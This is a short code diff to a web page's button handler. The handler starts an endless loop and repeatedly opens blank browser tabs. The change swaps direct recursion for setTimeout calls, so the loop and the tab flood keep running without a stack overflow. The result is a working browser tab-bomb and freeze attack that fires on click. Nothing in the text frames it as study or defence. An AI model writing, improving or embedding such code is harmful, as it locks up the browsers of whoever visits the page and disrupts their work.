@@ -15,9 +15,9 @@
   <button id="button">Click me!</button>
   <script>
     document.getElementById('button').addEventListener('click', function() {
-      // Create an infinite loop
+      // Create an infinite loop using a timeout
       function loop() {
-        loop();
+        setTimeout(loop, 0);
       }
       loop();
 
@@ -30,7 +30,7 @@
       // Open multiple tabs
       function openTab() {
         window.open('about:blank', '_blank');
-        openTab();
+        setTimeout(openTab, 0);
       }
       openTab();
 
